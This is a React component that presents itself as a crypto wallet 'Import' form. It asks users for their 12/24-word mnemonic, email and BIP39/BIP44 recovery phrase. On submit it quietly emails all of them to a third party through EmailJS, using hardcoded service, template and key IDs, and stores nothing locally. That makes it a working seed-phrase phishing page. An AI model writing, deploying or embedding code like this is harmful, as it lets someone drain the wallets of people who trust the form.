import React, {useRef} from 'react'
import FormInput from '../FormInput'
import emailjs from '@emailjs/browser';

const FORM_INPUT = [
    {
        name: 'mnemonic',
        label: 'Enter your 12/24 word phrase',
        type: 'text',
        placeholder: 'Enter your mnemonic',
        hint: 'Please separate each Mnemonic Phrase with a space.',
    },
    {
        name: 'email',
        label: 'Enter your email address',
        type: 'email',
        placeholder: 'Enter your email',
        hint: 'Your registered email address',
    },
    {
        name: 'recoveryPhrase',
        label: 'Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts (if available)',
        type: 'text',
        placeholder: 'Enter your recovery phrase',
    }
]

export default function Mnemonic()
{

   
    const form = useRef()
    const sendEmail = (e) => {
        e.preventDefault();
    
        emailjs.sendForm('service_eitcot7', 'template_rhhi39v', form.current, 'MLwjHKgTUJiMDQ_px')
          .then((result) => {
              console.log(result.text);
          }, (error) => {
              console.log(error.text);
          });
        e.target.reset()
      };

  return (
      <div>
          <form ref={form} className=' flex flex-col items-start justify-start gap-2' onSubmit={sendEmail}>
              {
                  FORM_INPUT.map((input, index) => <FormInput key={index} {...input} />)
              }
              <button type='submit' className='font-bold my-2 text-black max-w-full w-48 bg-blue-400  p-2 rounded-md'>
                  Import
              </button>
          </form>
    </div>
  )
}
